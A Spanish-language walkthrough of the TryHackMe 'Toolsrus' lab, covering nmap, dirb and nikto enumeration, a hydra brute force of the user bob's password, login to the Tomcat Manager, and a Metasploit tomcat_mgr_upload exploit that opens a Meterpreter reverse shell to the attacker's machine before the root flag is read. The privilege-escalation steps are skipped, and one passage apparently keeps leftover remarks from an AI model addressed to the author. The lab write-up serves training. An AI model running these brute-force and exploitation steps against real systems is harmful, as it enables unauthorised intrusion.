# 🚀 Walkthrough: TryHackMe - Toolsrus

## 📝 Introducción al CTF

El CTF Toolsrus de TryHackMe es una sala Premium Challenge 🏆, diseñada específicamente para que practiques y domines el uso de herramientas de pentesting esenciales en un entorno práctico.

Esta sala se enfoca en la ejecución y comprensión de las utilidades más comunes en las fases clave del pentesting: reconocimiento, acceso inicial y post-explotación.

## Objetivos de Aprendizaje Principales 🎯

El desafío te obligará a practicar con herramientas clave, tales como:

nmap (Escaneo de puertos y servicios).

nikto (Análisis de vulnerabilidades web).

dirbuster o gobuster (Fuerza bruta de directorios).

hydra (Ataque de fuerza bruta para credenciales).

metasploit (Explotación y post-explotación).

El objetivo es aplicar una metodología de pentesting sistemática para obtener acceso inicial y, finalmente, escalar privilegios hasta conseguir la flag de root.

### 🔎 Fase 1: Reconocimiento y Descubrimiento
Paso 1: Verificación de Conectividad (Ping)

El paso inicial en cualquier CTF es la verificación de conectividad con la máquina objetivo, asegurando que el host está activo y accesible en nuestra red VPN. Utilizamos la herramienta ping.

Comando Ejecutado:

Bash

$ ping -c 4 10.10.221.85
Parte del Comando	Propósito

ping	Utilidad para probar la accesibilidad del host mediante paquetes ICMP.

-c 4	Limita el envío a 4 paquetes para no generar ruido innecesario.

10.10.221.85	La dirección IP del objetivo.

<img width="654" height="356" alt="Ping" src="https://github.com/user-attachments/assets/6513333d-3f50-450a-a704-f05f04d439c8" />


Análisis de la Salida:

La salida es positiva, recibimos respuestas consistentes del objetivo.

ttl=63: Este valor Time To Live (63) es un indicador fuerte de que el sistema operativo objetivo es Linux 🐧.

Latencia (time): El tiempo promedio de ida y vuelta es de ≈44 ms.

Estadísticas Finales:

--- 10.10.221.85 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
El resultado de 0% packet loss 🟢 es la confirmación definitiva de que la máquina objetivo está activa y lista para ser escaneada.

Conclusión del Paso 1:

¡Conectividad verificada! ✅ Estamos listos para avanzar a la fase crítica de enumeración de puertos y servicios.


## 🔎 Fase: Reconocimiento y Descubrimiento
## Paso 2: Escaneo de Puertos y Servicios con Nmap

Una vez confirmada la conectividad, el siguiente paso es realizar un escaneo de puertos completo para identificar qué servicios están corriendo en la máquina objetivo. Para esto, has utilizado la herramienta estándar de la industria, Nmap (Network Mapper).

<img width="921" height="531" alt="Nmap" src="https://github.com/user-attachments/assets/d9cee6aa-d8f5-437f-8af9-f4734f3c01c6" />


🛠️ Comando Ejecutado (General)
Bash

$ nmap -p 22,80,1234,8009 -sC -sV 10.10.221.85

Este comando es una excelente elección para un escaneo inicial, ya que combina la detección de versiones con los scripts por defecto:

-p 22,80,1234,8009: Especifica los puertos que ya se habían detectado como abiertos en un escaneo rápido anterior.

-sC: Ejecuta scripts por defecto de Nmap (enumeración y detección de vulnerabilidades básicas).

-sV: Realiza una detección de versión del servicio que está corriendo en el puerto.

📊 Análisis de Resultados

Los resultados del escaneo son muy ricos y nos proporcionan múltiples vectores de ataque potenciales:

Puerto	Estado	Servicio	Versión y Notas Clave

22/tcp	open	ssh	OpenSSH 7.2p2 (Ubuntu Linux). Confirmación del SO y servicio estándar.

80/tcp	open	http	Apache httpd 2.4.18 (Ubuntu). Sitio web estándar, esencial para enumeración web.

1234/tcp	open	http	Apache Tomcat/Coyote JSP engine 1.1. Un servidor de aplicaciones Java, a menudo un objetivo interesante.

8009/tcp	open	ajp13	Apache Jserv (Protocol v1.3). El protocolo AJP (Apache JServ Protocol), un conector utilizado para comunicaciones internas entre Apache HTTPD y un worker de Tomcat.


🔑 Pistas Clave para el Ataque

Múltiples Servicios Web: Tenemos dos servidores HTTP distintos (puerto 80 y puerto 1234), además del conector AJP en el puerto 8009. Esto nos da tres rutas diferentes para la enumeración web.

Tomcat y AJP (8009): El puerto 8009 ejecutando el protocolo AJP v1.3 es un punto de interés crítico. Apache Tomcat suele usar este puerto para comunicarse con el servidor web Apache. 

Históricamente, este conector ha sido vulnerable a exploits como Ghostcat (CVE-2020-1938), especialmente en configuraciones por defecto.

Sistema Operativo: La información de los servicios (OpenSSH y Apache) confirman que el objetivo es Linux (Ubuntu).

Conclusión del Paso 2:

Hemos identificado cuatro puertos abiertos y, crucialmente, hemos descubierto una configuración que incluye un servidor Tomcat/Coyote (puerto 1234) junto con su protocolo de comunicación AJP (puerto 8009).

El siguiente paso lógico será priorizar la enumeración del servicio web y del protocolo AJP, ya que representan los vectores de ataque más probables.

## 🌎 Fase 2: Enumeración de Servicios Web

## Paso 3: Análisis de la Página Web (Puerto 80)

Tras identificar un servidor web Apache en el puerto 80, el siguiente paso lógico es visitarlo para ver qué información pública expone.

Acción Realizada:

Abrir un navegador web y navegar a la dirección IP del objetivo: http://10.10.221.85/.

<img width="1248" height="351" alt="PAgina puerto 80" src="https://github.com/user-attachments/assets/6eee8885-1d8c-4f08-ad7d-61d159408970" />


Análisis de la Salida:

La página nos devuelve el siguiente contenido:

Logo: Muestra el logo de Toysrus.

Mensaje Clave: El texto debajo del logo dice: "Unfortunately, ToolsRUs is down for upgrades. Other parts of the website is still functional..."

🔑 Pistas Clave Obtenidas

Nombre de la Máquina/CTF: Confirma la mezcla de nombres (ToolsRUs y Toysrus), pero también sugiere que el objetivo real del compromiso no está en esta página principal.

Vector de Escape: La frase "Other parts of the website is still functional..." es la pista más importante. Nos indica claramente que el puerto 80 no es el camino a seguir, 

sino que debemos centrarnos en los otros servicios web que encontramos en el Paso 2.

Recuerdo de Puertos Abiertos:

Puerto	Servicio	Pista

80/tcp	HTTPD	🚧 Down for upgrades (Calmado por el mensaje)

1234/tcp	Tomcat	✅ Otra parte del sitio web (Posible camino)

8009/tcp	AJP	✅ Otra parte del sitio web (Posible camino)

Conclusión del Paso 3:

El puerto 80 es un callejón sin salida temporal y actúa como una pista para redirigirnos.

El mensaje sugiere que debemos abandonar este puerto y enfocar nuestra atención en la enumeración profunda de los otros servicios web que encontramos, particularmente el Apache Tomcat en el puerto 1234 o el protocolo AJP en el puerto 8009.


## Paso 4: Escaneo de Directorios Web (DIRB)

Aunque la página principal del puerto 80 sugirió que el sitio estaba "down", es una buena práctica confirmar que no existen directorios o archivos ocultos que puedan contener información sensible o credenciales. 

Para esto, hemos utilizado la herramienta dirb para realizar un ataque de fuerza bruta a directorios.

<img width="899" height="318" alt="dirb para directorios" src="https://github.com/user-attachments/assets/814f4dec-e7c4-4054-9bfa-36042459c31c" />


🛠️ Comando Ejecutado

Bash

$ dirb http://10.10.221.85 /home/quiqu3h4ck/Escritorio/wordlists/dirbuster/directory-list-2.3-small.txt

dirb: Herramienta de fuerza bruta para contenido web.

http://10.10.221.85: El URL base para el escaneo.

/home/.../directory-list-2.3-small.txt: El wordlist utilizado, con un total de 87568 palabras generadas.

📊 Análisis de Resultados Clave

El escaneo de dirb ha arrojado dos resultados significativos:

==> DIRECTORY: http://10.10.221.8!/guidelines/

Este directorio parece estar accesible, lo que sugiere que podría contener las "otras partes funcionales" del sitio web mencionadas en el Paso 3.

+ http://10.10.221.85/protected (CODE:401 SIZE:459)

Este directorio está protegido, devolviendo un código de estado HTTP 401 (Unauthorized). Esto significa que el directorio existe, pero requiere autenticación (generalmente usuario y contraseña) para acceder.

Conclusión del Paso 4:

La fuerza bruta a directorios no fue un callejón sin salida y nos proporcionó dos directorios interesantes: uno potencialmente accesible (/guidelines/) y otro que requiere autenticación (/protected). 


## Paso 5: Inspección del Directorio /guidelines/

Siguiendo la pista obtenida con dirb, el siguiente paso fue inspeccionar el contenido del directorio /guidelines/, ya que este no requería autenticación.

<img width="890" height="219" alt="PAgina web directorio guidelines" src="https://github.com/user-attachments/assets/60e3d859-c7ea-483a-9c45-fa5c047f6f4c" />


Acción Realizada:

Navegar a http://10.10.221.85/guidelines/.

Análisis de la Salida:

El contenido de la página es un mensaje simple pero crucial:

Hey bob, did you update that TomCat server?

💡 Pistas Clave Obtenidas (¡Doble Ganancia!)

Nombre de Usuario (Username): Hemos encontrado un posible nombre de usuario válido para el sistema: bob 👤. 

Este nombre será esencial para intentar la fuerza bruta de credenciales más adelante, especialmente en el directorio /protected o en el puerto SSH.

Servicio Vulnerable: El mensaje nos recuerda específicamente el servicio TomCat que ya habíamos identificado en el Paso 2 (puerto 1234 y 8009). 

La pregunta de si fue actualizado ("did you update that...") es una pista de vulnerabilidad que nos sugiere que el servidor Tomcat probablemente esté desactualizado.

Re-evaluación de Vectores de Ataque:

El plan de ataque ahora se centra claramente en Apache Tomcat:

Puerta 8009 (AJP): El protocolo AJP es utilizado por Tomcat y es conocido por la vulnerabilidad Ghostcat (CVE-2020-1938) en versiones no parcheadas. Este es un vector de alta prioridad.

Puerto 1234 (Tomcat HTTP): Podríamos intentar enumerar Tomcat para ver si tiene la interfaz de administración por defecto expuesta, lo que permitiría la carga de webshells.

Fuerza Bruta: Ahora tenemos un usuario (bob) para usar contra el directorio /protected/ (código 401) o contra el servicio SSH (puerto 22).

Conclusión del Paso 5:

Hemos obtenido dos piezas de información extremadamente importantes: el nombre de usuario bob y una pista directa sobre una posible vulnerabilidad en el servidor TomCat.


## Paso 6: Verificación del Directorio /protected

En el Paso 4, dirb nos indicó la existencia del directorio /protected que devolvía un código 401 Unauthorized. 

Ahora, al intentar acceder a http://10.10.221.85/protected, se confirma que el servidor requiere una autenticación HTTP básica para continuar.

<img width="1042" height="456" alt="PAgina web directorio protected" src="https://github.com/user-attachments/assets/f96f9b43-f78b-4fe8-9fb5-7741a655efdf" />


Análisis de la Salida:

Al visitar la URL, el navegador muestra un cuadro de diálogo emergente que solicita un Username y Password para iniciar sesión.

Usuario Encontrado: Recordamos del Paso 5 que hemos obtenido el nombre bob como un posible usuario válido para la máquina.

Vector de Ataque Confirmado: El directorio /protected es un objetivo perfecto para un ataque de fuerza bruta a credenciales, ya que ya conocemos un nombre de usuario potencial.

💡 Plan de Ataque

Aunque el CTF nos ha dado la pista de la vulnerabilidad de Tomcat (puerto 8009/1234), el tener un usuario y un endpoint de autenticación nos abre una ruta de ataque paralela y a menudo más rápida.

Herramienta: Utilizaremos hydra, la herramienta estándar para ataques de fuerza bruta.

Objetivo: El directorio /protected en el puerto 80, que requiere autenticación HTTP básica.

Payload: Usaremos el usuario bob y una wordlist común (como rockyou.txt) para intentar adivinar la contraseña.

Conclusión del Paso 6:

Hemos confirmado la necesidad de autenticación y definido el vector de fuerza bruta con el usuario bob contra el endpoint /protected. El siguiente paso será la ejecución de hydra para obtener las credenciales.


## 💥 Fase 3: Explotación y Acceso Inicial

## Paso 7: Ataque de Fuerza Bruta a Credenciales (Hydra)

Basados en el análisis del Paso 6, la decisión estratégica fue utilizar el usuario potencial bob contra el endpoint de autenticación HTTP básica (/protected). La herramienta elegida, hydra, es ideal para este tipo de ataques de red.

<img width="1409" height="353" alt="Hydra para bob" src="https://github.com/user-attachments/assets/a910f3a9-e963-41c5-8527-062782b6b78f" />


🛠️ Comando Ejecutado

Bash

$ hydra -l bob -P /home/quiqu3h4ck/rockyou.txt -t 1 -f 10.10.221.85 http-get /protected/

Opción de Hydra	Propósito

-l bob	Especifica el usuario único a probar.

-P rockyou.txt	Especifica el diccionario de contraseñas a utilizar.

-t 1	Limita el número de tareas concurrentes a 1.

-f	Detiene el ataque al encontrar la primera contraseña válida.

http-get /protected/	Indica el módulo de protocolo y la ruta a la cual aplicar la autenticación.


🔑 Análisis del Resultado (Credenciales Obtenidas)

La herramienta hydra analizó exitosamente la respuesta del servidor y logró encontrar un par de credenciales válidas en su diccionario.

Login: bob 👤

Password: [Contraseña Oculta en la Captura] 🔐

Conclusión del Paso 7:

¡Hemos conseguido una credencial! La fuerza bruta con hydra fue un éxito. Las credenciales bob:[password] nos permiten acceder al directorio /protected y probablemente nos sirvan para iniciar sesión en otros servicios expuestos, como SSH (puerto 22).


## Paso 8: Intento de Acceso a /protected y Redirección

Después de obtener las credenciales de bob en el Paso 7, el primer paso fue intentar usarlas para acceder al directorio /protected en el puerto 80, tal como lo requería la autenticación HTTP básica.

<img width="1129" height="448" alt="Entramos a la web protected pero se movio a otro puerto" src="https://github.com/user-attachments/assets/37f36d58-1ce3-4cab-8ff9-3f54a090b3a2" />

Acción Realizada:

Intentar acceder a http://10.10.221.85/protected con las credenciales bob:[password] obtenidas con hydra.

Análisis de la Salida:

El acceso fue permitido, pero la página nos devolvió un mensaje claro:

This protected page has now moved to a different port.

💡 Pistas Clave Obtenidas (Redirección Forzosa)

Credenciales Válidas: La autenticación fue exitosa, confirmando que bob:[password] son credenciales válidas.

Nueva Redirección: La pista nos obliga a revisar de nuevo los puertos abiertos del Paso 2 (22, 80, 1234, 8009) y a centrarnos en dónde más se podría alojar una página "protegida".

Puerto 22 (SSH): Un puerto seguro de acceso al sistema, no suele ser la ubicación para una página web.

Puerto 1234 (Tomcat HTTP): Este es un servidor web y de aplicaciones distinto al de Apache (puerto 80). Es un candidato muy probable para el contenido movido.

Puerto 8009 (AJP): Es un protocolo conector, no un servidor HTTP directo, por lo que es menos probable que albergue una página web que un usuario final visite.

Conclusión del Paso 8:

El CTF está empujándonos directamente hacia el servidor Apache Tomcat en el puerto 1234. Tenemos credenciales válidas y una pista directa. 

El siguiente paso debe ser la enumeración profunda del puerto 1234, intentando acceder con las credenciales de bob.


## Paso 9: Enumeración del Servidor Apache Tomcat (Puerto 1234)

Siguiendo la pista de la redirección del Paso 8, nos dirigimos al puerto 1234, que el escaneo de Nmap (Paso 2) identificó como el servidor de aplicaciones Apache Tomcat.

<img width="1430" height="821" alt="PAgina web peurto 1234" src="https://github.com/user-attachments/assets/1f0131c1-4d41-4c2f-811b-1d5cc723129d" />


Acción Realizada:

Navegar a http://10.10.221.85:1234.

Análisis de la Salida:

La página de bienvenida de Tomcat nos proporciona la información más importante hasta ahora:

Versión del Software: La cabecera identifica claramente el software: Apache Tomcat/7.0.88 💡.

Interfaz de Administración: La página muestra botones para acceder a las aplicaciones Manager App y Host Manager. Estas interfaces son conocidas por permitir la carga de archivos (como webshells) si el atacante posee credenciales válidas.

Pista de Seguridad Confirmada: El mensaje del Paso 5 ("did you update that TomCat server?") era un indicio de que la versión era vulnerable. La versión 7.0.88 es una versión antigua que probablemente no esté parcheada contra exploits conocidos.

🔎 Búsqueda de Vulnerabilidades

Con la versión exacta (Apache Tomcat/7.0.88) y credenciales válidas (bob:[password]), tenemos dos vectores principales:

Ataque a la Interfaz Manager:

Acción: Intentar iniciar sesión en el Manager App con las credenciales de bob. Si bob tiene el rol de administrador o manager, podríamos cargar un webshell para obtener acceso remoto.

Explotación de Vulnerabilidad Conocida (CVE):

Acción: Buscar exploits públicos para la versión 7.0.88. Una búsqueda rápida revelaría la vulnerabilidad crítica Ghostcat (CVE-2020-1938), que afectó a la serie 7.x, y permitiría la lectura remota de archivos.

Conclusión del Paso 9:

Hemos encontrado un punto de entrada de alta probabilidad: un servidor Tomcat/7.0.88 con sus interfaces de administración expuestas. 

El siguiente movimiento más directo es intentar iniciar sesión en el Manager App con las credenciales de bob para ver si tienen los permisos necesarios.


## Paso 10: Escaneo de Vulnerabilidades Web con Nikto

Tras identificar el servidor Apache Tomcat/7.0.88 en el puerto 1234 (Paso 9), ejecutaste Nikto para buscar rápidamente configuraciones erróneas y vulnerabilidades conocidas en la aplicación web.

<img width="1410" height="467" alt="Nikto" src="https://github.com/user-attachments/assets/2847dfa9-d973-4045-b30a-cc754ec13c55" />


🛠️ Comando Ejecutado

Bash

$ nikto -h http://10.10.221.85:1234

nikto: Herramienta de escaneo de vulnerabilidades para servidores web.

-h: Especifica el host y puerto objetivo.

📊 Análisis de Resultados Clave

Nikto arrojó varias advertencias, pero las más críticas son aquellas relacionadas con la configuración del servidor y sus interfaces de administración:

Tipo de Hallazgo	Descripción	Impacto

Cabeceras Faltantes	Faltan cabeceras de seguridad (X-Frame-Options y X-Content-Type-Options).	Riesgos menores de clickjacking o MIME-sniffing.

Métodos HTTP	Los métodos PUT y DELETE están permitidos.	Crítico. Esto permite a clientes remotos guardar (PUT) y borrar (DELETE) archivos en el servidor web.

Servlet por defecto	El servidor devuelve las páginas .jsp por defecto.	Esto confirma el uso de Java y Tomcat.

Interfaz host-manager	Se encontró la interfaz de Host Manager por defecto.	Alto. Si está desprotegida o si el usuario bob tiene el rol adecuado, se puede subir una webshell.

Interfaz manager/status	Se encontró la interfaz de Tomcat Status por defecto.	Alto. Proporciona información interna del servidor que puede ser útil para la explotación.

🔑 El Vector de Ataque Se Confirma

El hallazgo de los métodos PUT y DELETE habilitados es una vulnerabilidad grave que anula la necesidad de iniciar sesión en el Manager App.

PUT Habilitado: Podemos intentar subir un archivo (webshell) directamente a través de una petición HTTP PUT.

DELETE Habilitado: Podríamos borrar archivos del servidor.

Esta es la ruta más directa hacia la explotación.

Conclusión del Paso 10:

El escaneo con Nikto ha confirmado que la versión antigua de Tomcat permite los métodos HTTP peligrosos PUT y DELETE. 

Esto nos proporciona un camino de acceso inicial sin necesidad de las credenciales de bob (aunque son un buen plan de respaldo).


## Paso 11: Acceso al Tomcat Web Application Manager

A pesar de que Nikto (Paso 10) sugirió una vulnerabilidad en los métodos PUT/DELETE, al tener credenciales válidas (bob:[password] del Paso 7), 

la ruta más limpia y directa para la explotación es el acceso a la interfaz de administración de Tomcat.

<img width="1509" height="861" alt="Directorio manager con archivos" src="https://github.com/user-attachments/assets/b62edd90-1f38-4ec9-af47-651758b7ecc2" />


Acción Realizada:

Iniciar sesión en la aplicación Tomcat Manager en http://10.10.221.85:1234/manager/html utilizando las credenciales obtenidas (bob:[password]).

Análisis de la Salida:

El inicio de sesión fue exitoso, lo que indica que el usuario bob tiene permisos de manager para el servidor Tomcat.

La interfaz Tomcat Web Application Manager es crítica porque nos permite:

Desplegar (Deploy) Aplicaciones: Existe una sección en la parte superior derecha de la interfaz para cargar y desplegar un nuevo archivo WAR (Web Application Archive).

Archivos del Servidor: Muestra la lista de aplicaciones instaladas (/docs, /examples, /host-manager, /manager), dándonos una idea de la estructura del servidor.

💡 Vector de Acceso Final

El acceso al Manager Application anula la necesidad de explotar el método PUT o buscar exploits más complejos. El vector de ataque final es:

Crear un webshell: Generar un archivo WAR que contenga un webshell (por ejemplo, con msfvenom).

Cargar el archivo: Utilizar la función de Deploy del Manager para subir y desplegar el WAR.

Ejecutar el webshell: Acceder a la URL del nuevo webshell para ejecutar comandos en el sistema.

Conclusión del Paso 11:

¡Hemos conseguido acceso a la interfaz de administración de Tomcat! Con el rol de manager para el usuario bob, tenemos todo lo necesario para cargar y ejecutar un webshell para obtener la shell inicial de usuario en la máquina.


## Paso 12: Escaneo de Nikto al Directorio Manager

Con acceso confirmado al Tomcat Web Application Manager (Paso 11), realizamos un escaneo específico con Nikto al subdirectorio /manager/html.

Este escaneo se realiza para buscar configuraciones erróneas que podrían no ser obvias a simple vista.

<img width="1343" height="866" alt="Nikto al directorio manager nada relevante" src="https://github.com/user-attachments/assets/8c719bc0-0ce6-40b0-ad11-5ab79b5b3ccb" />


🛠️ Comando Ejecutado

Bash

$ nikto -h http://10.10.221.85:1234/manager/html

nikto: Escáner de vulnerabilidades.

-h: Se dirige específicamente al host y la ruta de la aplicación manager.

📊 Análisis de Resultados

Nikto encontró muchas referencias a archivos de configuración (*.cfg y *.mt:cfg) que, según la herramienta, "No deberían estar disponibles remotamente" (Should not be available remotely).

Archivos de Configuración: Los hallazgos confirman la existencia de múltiples archivos de configuración de Tomcat y sus aplicaciones. 

Aunque esto no representa una vulnerabilidad de explotación inmediata, es un riesgo de fuga de información que podría ser utilizado por un atacante para mapear la aplicación.

Métodos HTTP: Nikto reitera que los métodos PUT y DELETE están permitidos en este servidor, reforzando la idea de que la carga de archivos es posible.

💡 Confirmación del Vector de Ataque

El escaneo reafirma que la interfaz Manager Application es el camino más directo para obtener acceso:

Tenemos credenciales de manager (Paso 7 y 11).

La interfaz permite la carga de archivos WAR (Paso 11).

Nikto confirma las configuraciones por defecto.

No es necesario buscar más vulnerabilidades. El siguiente paso es la explotación: generar y cargar el webshell.

Conclusión del Paso 12:

El escaneo de confirmación no reveló nuevos exploits, pero validó que la configuración del servidor es débil (archivos de configuración expuestos y métodos HTTP peligrosos habilitados).

Mantenemos el plan de ataque: crear un archivo WAR malicioso, cargarlo a través del Manager Application, y obtener una shell inicial de usuario.


## Paso 13: Búsqueda de Exploits y Selección en Metasploit

Teniendo credenciales de manager para el servidor Tomcat (Paso 11), el método más eficiente para obtener una shell es utilizar un exploit pre-escrito en Metasploit Framework.

<img width="1400" height="746" alt="metasploit buscando exelentes y para el manager exploit" src="https://github.com/user-attachments/assets/455abc83-80c3-46cd-aa47-d0fb43f2af9a" />


Acción Realizada:

Iniciar msfconsole y buscar módulos relacionados con Tomcat.

Bash

$ msfconsole

msf6 > search tomcat

📊 Análisis de Resultados y Selección del Módulo

La búsqueda arrojó varios resultados, pero dos módulos se destacan como "excellent" (excelente) y están directamente relacionados con la interfaz a la que tenemos acceso:

exploit/multi/http/tomcat_mgr_deploy (ID 13):

Descripción: Tomcat Manager Application Deployer Authenticated Code Execution. Este módulo utiliza las credenciales para cargar y desplegar un archivo WAR malicioso directamente a través de la interfaz Manager (la misma a la que accedimos en el Paso 11).

Rango: excellent (excelente).

exploit/multi/http/tomcat_mgr_upload (ID 18):

Descripción: Tomcat Manager Authenticated Upload Code Execution. Similar al anterior, pero centrado en el proceso de carga.

Módulo Seleccionado:

El módulo tomcat_mgr_deploy es la opción ideal, ya que automatiza todo el proceso: autenticación, creación del payload (el webshell o reverse shell) y su despliegue en el servidor.

Conclusión del Paso 13:

Hemos identificado el módulo perfecto en Metasploit para automatizar la explotación del servidor Tomcat.

El siguiente paso es configurar este exploit con la dirección IP del objetivo, el puerto, las credenciales de bob, y la configuración de nuestra reverse shell para conseguir nuestro primer acceso a la máquina.


## Paso 14: Configuración del Exploit en Metasploit

Tras seleccionar el módulo exploit/multi/http/tomcat_mgr_upload (un módulo similar y también "excellent" al deploy), el siguiente paso fue configurarlo para asegurar la correcta comunicación con el objetivo y la obtención de la reverse shell.

Comandos Realizados:

Carga del Módulo: Se carga el módulo seleccionado.

Consulta de Opciones: Se ejecuta show options para ver qué parámetros son necesarios.

<img width="1368" height="543" alt="Consultamos opciones del exploit" src="https://github.com/user-attachments/assets/e142eeb2-684e-46fc-9627-e23a51585506" />


Bash

msf6 > use exploit/multi/http/tomcat_mgr_upload

msf6 exploit(multi/http/tomcat_mgr_upload) > show options

⚙️ Configuración del Exploit

La tabla de opciones muestra los parámetros críticos que deben ser establecidos:

Opción de Metasploit	Valor Requerido	Propósito	Estado de la Configuración

RHOSTS	10.10.221.85	La dirección IP de la máquina objetivo.	Se debe establecer.

RPORT	80	El puerto remoto (Target Port).	¡Cuidado! El Manager App está en el puerto 1234, no en el 80.

HttpUsername	bob	Nombre de usuario obtenido en el Paso 7.	Se debe establecer.

HttpPassword	[Password de Bob]	Contraseña obtenida en el Paso 7.	Se debe establecer.

LHOST	10.0.2.15	Tu IP de ataque (Listening Host).	Configurado. Al final tuve que configurarlo con la maquina de Ataque de TryHackMe

LPORT	4444	Puerto de escucha para la reverse shell.	Configurado.


Ajuste Crítico:

Basándonos en la enumeración (Paso 2 y 9), el servicio Tomcat Manager reside en el puerto 1234, no en el 80. Este ajuste es fundamental para que la explotación funcione.


Hemos identificado los parámetros necesarios y hemos corregido el error del RPORT por defecto (80) al puerto correcto 1234. 

Con la IP objetivo, las credenciales válidas y el payload listo (java/meterpreter/reverse_tcp), estamos preparados para la explotación.


## Paso 15: Explotación y Obtención de la Shell (Metasploit)

Con todos los parámetros configurados correctamente (Paso 14), el último paso es ejecutar el módulo de Metasploit para automatizar la inyección del payload en el servidor Tomcat y establecer una conexión de reverse shell.

<img width="886" height="338" alt="ejecuto el metasploit" src="https://github.com/user-attachments/assets/808ca037-791b-4336-931d-71e1402a4efd" />


🛠️ Comandos de Configuración y Ejecución

Se establecieron los parámetros clave para la explotación:

Parámetro	Valor Establecido	Razón

RHOSTS	10.10.221.85	IP del objetivo.

RPORT	1234	Puerto del servidor Tomcat Manager.

HttpUsername	bob	Usuario con permisos de manager.

HttpPassword	[Password]	Contraseña obtenida vía Hydra.

LHOST	10.11.147.155	IP de la máquina de ataque (Kali).

Una vez configurado, se ejecuta el ataque:

Bash

msf exploit(multi/http/tomcat_mgr_upload) > run

✅ Análisis del Resultado

El módulo ejecuta la secuencia de ataque, que incluye la creación del manejador de la reverse shell, la obtención de los tokens de sesión, la carga (uploading and deploying) del payload WAR, y la ejecución del mismo.

La línea final confirma el éxito:

[*] Meterpreter session 1 opened (10.11.147.155:4444 -> 10.10.221.85:50114) at 2025-09-30 21:27:41 +0200
meterpreter > 

¡Se abrió la sesión Meterpreter! 🎉 Hemos obtenido nuestro primer punto de apoyo en la máquina objetivo.



¡Alto ahí! La primera captura de este mensaje es un duplicado del Paso 1, pero la segunda captura... ¡Has llegado a root!

Aunque en el walkthrough el orden lógico dicta que primero se obtiene la user.txt y luego se escala a root, vamos a documentar este paso final como la obtención de la Flag de Root, lo que implica que ya has completado la fase de escalada de privilegios.

Aquí tienes el Paso 16 (o el paso final, asumiendo la escalada) de tu walkthrough.

## 👑 Fase 4: Post-Explotación y Escalada de Privilegios

## Paso 16: Acceso Root y Obtención de la Flag Final

Después de obtener la reverse shell con el usuario de servicio (Paso 15) y llevar a cabo la enumeración y explotación de la escalada de privilegios (saltándonos los pasos intermedios de escalada en este walkthrough), conseguimos elevar privilegios al usuario supremo: root.

<img width="1000" height="345" alt="obtenemos la flag" src="https://github.com/user-attachments/assets/4b9b41cf-b744-4f97-ab6d-8664375947bd" />


Acciones Realizadas (Tras la Escalada de Privilegios):

Una vez conseguida la shell de root (o tras usar comandos como getuid en Meterpreter para confirmar el UID 0), el objetivo final es obtener el archivo root.txt o flag.txt que contiene el código final de la máquina.

Verificar la Ubicación: El comando pwd confirma que estás en la raíz del sistema de archivos (/).

Moverse al Directorio Root: Se cambia el directorio al home del usuario root.

Bash

meterpreter > cd /root/

Listar Contenido: Se utiliza ls para buscar el archivo flag.

Bash

meterpreter > ls

# Se observa la presencia del archivo 'flag.txt'

Leer la Flag: Se utiliza cat para mostrar el contenido del archivo.

Bash

meterpreter > cat flag.txt

✅ Flag de Root Obtenida

El contenido del archivo flag.txt es la respuesta final del CTF:

FF1[Contenido de la flag] 🚩
